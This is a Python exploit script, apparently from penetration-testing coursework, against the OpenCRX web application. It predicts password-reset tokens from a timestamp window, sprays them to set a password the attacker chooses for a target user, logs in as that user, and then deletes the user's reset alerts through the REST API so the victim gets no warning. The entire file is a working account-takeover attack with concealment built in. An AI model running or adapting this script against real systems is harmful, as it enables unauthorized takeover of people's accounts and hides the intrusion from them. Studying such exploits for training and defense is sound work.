import requests, argparse, subprocess, sys, time, base64

parser = argparse.ArgumentParser()
parser.add_argument('-f','--fqdn', help='FQDN of OpenCRX server', required=True)
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

proxies = {
    'http':'http://127.0.0.1:8080'
}

print("[-] Checking server time for delay...")
local_delay_check = subprocess.run(["date"], stdout=subprocess.PIPE)
local_time = local_delay_check.stdout.decode('utf-8')
delay_check = requests.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
server_time = delay_check.headers['Date']
server_time_split = server_time.split(" ")
local_time_split = local_time.split(" ")
server_time_seconds = server_time_split[4].split(":")
local_time_seconds = local_time_split[4].split(":")
delay = int(server_time_seconds[2]) - int(local_time_seconds[2])
minute_delay = int(server_time_seconds[1]) - int(local_time_seconds[1])
if minute_delay != 0:
    delay += minute_delay * 60

print(f"[+] Server Time: {server_time}\n[+] Local Time: {local_time}[+] Delay: {delay}")

print("[-] Sending request to reset password...")
sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
start_time = sub.stdout.rstrip().decode('utf-8')
if delay < 0:
    print("[-] Compensating for time difference...")
    time.sleep(delay * -1)
pw_reset = requests.post(f'{args.fqdn}/opencrx-core-CRX/RequestPasswordReset.jsp', data={'id':args.user})
time.sleep(.5)
sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
stop_time = sub.stdout.rstrip().decode('utf-8')
print(f"[+] Server time at password reset: {pw_reset.headers['Date']}")
if "Password reset request successful for" not in pw_reset.text:
    print("[!] Something went wrong!  Make sure you have an existing username and try again")
    sys.exit(2)
if delay > 0:
    print("[-] Compensating for time difference...")
    time.sleep(delay)
    sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
    stop_time = sub.stdout.rstrip().decode('utf-8')
print(f"[+] Start: {start_time} -- Stop: {stop_time}")

print("[-] Generating token list...")
subprocess.run([f"java OpenCRXToken {start_time} {stop_time} > /tmp/tokens.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
test = subprocess.run(["ls /tmp/tokens.txt"], stdout=subprocess.PIPE, shell=True)
if len(test.stdout) < 2:
    print("[!] Could not generate token list!  Make sure OpenCRXToken.java is in the current working directory and try again...")
    sys.exit(2)

print("[-] Beginning token spray...")
f = open("/tmp/tokens.txt", "r")
for token in f:
    data = {
        't':token.rstrip(),
        'p':'CRX',
        's':'Standard',
        'id':args.user,
        'password1':args.password,
        'password2':args.password
    }
    r = requests.post(f"{args.fqdn}/opencrx-core-CRX/PasswordResetConfirm.jsp", data=data)
    response = r.text
    if "Unable to reset password" not in response:
        print(f"[+] Password was successfully reset!  Token = {token.rstrip()}")
        break

print("[-] Attempting to Login...")
s = requests.Session()
s.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
data = {
    "j_username" : args.user,
    "j_password" : args.password
}
s.post(f"{args.fqdn}/opencrx-core-CRX/j_security_check", data=data)
final_login = s.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=en_US&timezone=Europe%2FZurich&initialScale=1&loginFailed=false")
final_url = final_login.text.split("'")[1]
logged_in = s.get(final_url)
if "openCRX -" in logged_in.text and "- Home" in logged_in.text:
    print(f"[+] Login Successful!  You now have full control of the user's account!\n[+] Username: {args.user}\n[+] Password: {args.password}")
else:
    print(f"[!] Something MAY have gone wrong.  Try logging in manually at {args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
    exit()

print(f"[-] Waiting for the server to catch up...")
time.sleep(3)

print("[-] Attempting to identify the ID the Reset Password Alert...")

auth_token = f"{args.user}:{args.password}"
auth_token_bytes = auth_token.encode("ascii")

base64_bytes = base64.b64encode(auth_token_bytes)
base64_token = base64_bytes.decode("ascii")

headers = {
    "Accept":"application/json",
    "Authorization":f"Basic {base64_token}"
}

get_alerts = requests.get(f"{args.fqdn}/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/{args.user}/alert", headers=headers, proxies={'http':'http://127.0.0.1:8080'})

alerts = get_alerts.json()
id_list = []

for alert in alerts['objects']:
    xri_list = alert['identity'].split('/')
    length = len(xri_list)
    alert_id = xri_list[length - 1]
    print(f"[+] Alert ID retrieved through API -- {alert_id}")
    id_list.append(alert_id)

print("[-] Attempting to delete alerts...")
for alert in id_list:
    delete_alert = requests.delete(f"{args.fqdn}/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/{args.user}/alert/{alert}", headers=headers)
    if delete_alert.status_code > 199 and delete_alert.status_code < 300:
        print(f"[+] Alert {alert} has been successfully deleted!")
    else:
        print(f"[!] Something went wrong!  Status Code: {delete_alert.status_code}")

print(f"[+] Exploit Successful!  Log in here: {args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")